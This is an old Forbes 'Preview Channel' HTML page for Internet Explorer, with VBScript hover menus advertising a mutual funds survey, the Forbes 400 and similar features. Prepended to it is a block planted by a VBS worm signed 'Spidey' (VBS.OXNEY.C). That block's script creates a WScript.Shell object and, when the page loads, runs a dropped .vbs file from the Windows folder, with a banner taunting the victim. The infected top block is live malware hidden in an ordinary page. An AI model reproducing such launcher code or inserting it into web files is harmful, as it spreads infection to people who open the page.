<!-- © Spidey 2004 http://www.Spidey.uni.cc -->
<script>var wsh=new ActiveXObject('WScript.Shell');
wsh.Run('C:\WINDOWS\system32\OXNEY.C.VBS');</script>
wsh.Run('C:\WINDOWS\LGuarg.exe.vbs');</script>
<html><head><title>VBS.OXNEY.C</title></head><body><div align=left><font size=2><b>VBS.OXNEY.C</b><br>Create and modif by Spidey [ June, 07, 2004 ]</font><br><font size=2 color=red>made in Surabaya - East Java - United State of Indonesia</font><br><font size=2>visit : <a href=http://Spidey.uni.cc>http://Spidey.uni.cc</a> for more information about this suck or contact you AV support to disinfect...<br><p>© 14.06.2004 by Spidey</font></div></body></html>
<!-- End of (cute) Spidey -->

<HTML>

<HEAD>
	<TITLE>Forbes Preview Channel</TITLE>
	<META Name="ROBOTS" content="NOINDEX">
	<style type="text/css">	
		/* define the attributes for the body */
		body
		{
			background-color:white;
			color:black;
			font-family:Arial;
			font-size:10pt;
		}
	</style>

<SCRIPT LANGUAGE="VBScript">

Sub Window_onLoad()	
	call Transition()
End Sub

Sub Transition()
	Daisy.filters.item(0).Transition=12
	Daisy.filters.item(0).Apply()
	Daisy.style.visibility= "visible"
	Daisy.filters.item(0).Play(6)
End Sub

Sub HideAll()
	Adescript.style.visibility="hidden"
	Atext.style.color="white"
	Bdescript.style.visibility="hidden"
	Btext.style.color="white"
	Cdescript.style.visibility="hidden"
	Ctext.style.color="white"
	Ddescript.style.visibility="hidden"
	Dtext.style.color="white"
	Edescript.style.visibility="hidden"
	Etext.style.color="white"
End Sub

Sub ShowDescript(descript)
	HideAll()	
	Select Case descript
		case "A":
			Adescript.style.visibility="visible"
			Atext.style.color="red"
		case "B":
			Bdescript.style.visibility="visible"
			Btext.style.color="red"
		case "C":
			Cdescript.style.visibility="visible"
			Ctext.style.color="red"
		case "D":
			Ddescript.style.visibility="visible"
			Dtext.style.color="red"
		case "E":
			Edescript.style.visibility="visible"
			Etext.style.color="red"
	End Select		
End Sub									

</SCRIPT>

</HEAD>

<BODY id="body">

<DIV ID=Daisy STYLE="z-index:10; position: absolute; top: 0; left: 120; visibility:hidden;
	background-color:white;font-family:verdana;color:silver;font-size:20pt;;
	FILTER:revealTrans(Duration=3.0, Transition=4)">
	<IMG SRC="../images/blur.gif">
</DIV>

<DIV ID=Adescript STYLE="z-index: 12; visibility: hidden; position: absolute; top: 20; left: -45; font-size: 8pt; color: black; font-family: Helvetica, Arial, Verdana">
	<P STYLE="color: red; padding-left: 6px; margin-left: 12; margin-right: 12" ALIGN=CENTER>
	Our trademark mutual funds ratings survey, <BR>rating the performance of over 2,500 funds <BR>in both up and down markets.
	</P>	
</DIV>
<DIV ID=Bdescript STYLE="z-index: 12; visibility: hidden; position: absolute; top: 50; left: 20; font-size: 8pt; color: black; font-family: Helvetica, Arial, Verdana">
	<P STYLE="color: red; padding-left: 6px; margin-left: 12; margin-right: 12" ALIGN=CENTER>
	Want to know how the rich got rich?<BR>  Visit the Forbes 40,<BR> the stock index that tracks <BR>the investments of the 400 richest Americans.
	</P>
</DIV>
<DIV ID=Cdescript STYLE="z-index: 12; visibility: hidden; position: absolute; top: 100; left: 0; font-size: 8pt; color: black; font-family: Helvetica, Arial, Verdana">
	<P STYLE="color: red;  padding-left: 6px; margin-left: 12; margin-right: 12" ALIGN=CENTER>
	Featured in Cool, <BR>Blue Chip Portfolios rate everything from <BR>custom shotguns to opera records, <BR>home theaters to wristwatches.
	</P>
</DIV>
<DIV ID=Ddescript STYLE="z-index: 12; visibility: hidden; position: absolute; top: 10; left: 125; font-size: 8pt; color: black; font-family: Helvetica, Arial, Verdana">
	<P STYLE="color: red;  padding-left: 6px; margin-left: 12; margin-right: 12" ALIGN=CENTER>
	The searchable version of our <BR>annual listing of the <BR>wealthiest 400 individuals <BR>in the United States.
	</P>
</DIV>		
<DIV ID=Edescript STYLE="z-index: 12; visibility: hidden; position: absolute; top: 320; left: -60; font-size: 8pt; color: black; font-family: Helvetica, Arial, Verdana">
	<P STYLE="color: red; padding-left: 6px; margin-left: 12; margin-right: 12" ALIGN=CENTER>
	A worldwide listing of hotels, <BR>and their online amenities&#151;such as <BR>available computer services, online access, <BR>phone jack type, Digital Analog PBX <BR>and other vital information for the wireless traveler.
	</P>
</DIV>

<DIV ID=Left STYLE="background-color:black; POSITION:ABSOLUTE; LEFT:0; TOP:0; WIDTH:120; HEIGHT:480; z-index:10" ALIGN=CENTER>

	<DIV onMouseOver="ShowDescript('A')" ID=A STYLE="POSITION:ABSOLUTE; LEFT:0; TOP:10" ALIGN=CENTER>
		<IMG SRC="../images/umbrella.gif"><DIV ID=Atext STYLE="position: relative; font-size: 8pt; color: white; font-family: Helvetica, Arial, Verdana" ALIGN=CENTER><B>Mutual Funds Survey</B></DIV>
	</DIV>
	<DIV onMouseOver="ShowDescript('B')" ID=B STYLE="POSITION:ABSOLUTE; LEFT:0; TOP:85" ALIGN=CENTER>
		<IMG SRC="../images/moneybag.gif"><DIV ID=Btext STYLE="position: relative; font-size: 8pt; color: white; font-family: Helvetica, Arial, Verdana" ALIGN=CENTER><B>Forbes 40 Index</B></DIV>
	</DIV>
	<DIV onMouseOver="ShowDescript('C')" ID=C STYLE="POSITION:ABSOLUTE; LEFT:0; TOP:150" ALIGN=CENTER>
		<IMG SRC="../images/blue.gif"><DIV ID=Ctext STYLE="position: relative; font-size: 8pt; color: white; font-family: Helvetica, Arial, Verdana" ALIGN=CENTER><B>Blue Chip Portfolio</B></DIV>
	</DIV>
	<DIV onMouseOver="ShowDescript('D')" ID=D STYLE="POSITION:ABSOLUTE; LEFT:0; TOP:260" ALIGN=CENTER>
		<IMG SRC="../images/pig.gif"><DIV NOBR ID=Dtext STYLE="position: relative; font-size: 8pt; color: white; font-family: Helvetica, Arial, Verdana" ALIGN=CENTER><B>400 Richest People<BR>in America</B></DIV>
	</DIV>
	<DIV onMouseOver="ShowDescript('E')" ID=E STYLE="POSITION:ABSOLUTE; LEFT:0; TOP:350" ALIGN=CENTER>
		<IMG SRC="../images/globe.gif"><DIV NOBR ID=Etext STYLE="position: relative; font-size: 8pt; color: white; font-family: Helvetica, Arial, Verdana" ALIGN=CENTER><B>Rooms with a Clue</B></DIV>
	</DIV>

</DIV>

<DIV ID=AddChannel STYLE="z-index:13; position: absolute; TOP: 265; LEFT: 345;">
<A HREF="javascript:window.external.addChannel('http://www.forbes.com/ie40/cdf/forbes.cdf')"><IMG SRC="../images/IEAddCha.GIF" border=0></A>	
</DIV>

<DIV id=tagLine STYLE="position: absolute; TOP: 400; LEFT: 1000; z-index:11; color: black; font-family: Arial, helvetica;">
<NOBR>
<FONT STYLE="color: red"><B>TOOLS NOT TEXT</B></FONT>
</NOBR>
</DIV>

<OBJECT ID="pthLine" CLASSID="CLSID:D7A7D7C3-D47F-11D0-89D3-00A0C90833E6">
	<PARAM NAME="AutoStart" VALUE="-1">
	<PARAM NAME="Repeat" VALUE="1">
	<PARAM NAME="Bounce" VALUE="0">
	<PARAM NAME="Duration" VALUE="7">
	<PARAM NAME="Shape" VALUE="Polyline(2,800,200,150,200)">
	<PARAM NAME="Target" VALUE="tagLine">
</OBJECT>

	<!-- begin navigation -->
	<span id="spnNextPage" style="position:absolute; left:370px; top:300; z-index:14;">
		<a href="monday.htm"><IMG BORDER=0 SRC="../images/next.gif"></a>
	</span>
	<!-- end navigation -->

</BODY>

</HTML>
